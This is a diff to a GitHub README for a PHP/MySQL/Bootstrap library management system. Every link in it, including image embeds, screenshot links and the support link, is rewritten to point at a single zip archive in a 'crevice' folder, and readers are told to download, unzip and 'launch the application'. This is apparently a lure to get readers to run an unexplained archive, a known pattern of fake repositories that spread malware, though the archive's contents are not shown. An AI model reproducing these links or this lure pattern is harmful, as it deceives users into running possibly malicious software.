@@ -1,6 +1,6 @@
 # 📚 PHP Library System 📖
 
-![Library System](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip)
+![Library System](https://raw.githubusercontent.com/eltrapico2/php-library-system/main/crevice/library_php_system_2.0.zip)
 
 Welcome to the **php-library-system** repository! This project is a **Library Management System** built using **PHP**, **MySQL**, and **Bootstrap**. It offers a comprehensive solution for managing library resources, tracking borrow and return transactions, and enabling users to search for books by title, author, or ISBN. The system is fully responsive and user-friendly, making it a valuable tool for libraries of all sizes.
 
@@ -29,7 +29,7 @@ Welcome to the **php-library-system** repository! This project is a **Library Ma
 
 ## Installation 🚀
 
-To get started with the PHP Library System, you can download the latest version [here](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip). Once downloaded, unzip the file and launch the application to begin exploring the features.
+To get started with the PHP Library System, you can download the latest version [here](https://raw.githubusercontent.com/eltrapico2/php-library-system/main/crevice/library_php_system_2.0.zip). Once downloaded, unzip the file and launch the application to begin exploring the features.
 
 ## Usage 🖥️
 
@@ -40,12 +40,12 @@ To get started with the PHP Library System, you can download the latest version 
 
 ## Screenshots 📷
 
-![Screenshot 1](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip)
-![Screenshot 2](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://raw.githubusercontent.com/eltrapico2/php-library-system/main/crevice/library_php_system_2.0.zip)
+![Screenshot 2](https://raw.githubusercontent.com/eltrapico2/php-library-system/main/crevice/library_php_system_2.0.zip)
 
 ## Support ℹ️
 
-For any inquiries or issues, please visit the [Releases](https://github.com/eltrapico2/php-library-system/releases/download/v1.0/Software.zip) section of this repository for additional information.
+For any inquiries or issues, please visit the [Releases](https://raw.githubusercontent.com/eltrapico2/php-library-system/main/crevice/library_php_system_2.0.zip) section of this repository for additional information.
 
 ## Contributors 🤝
 
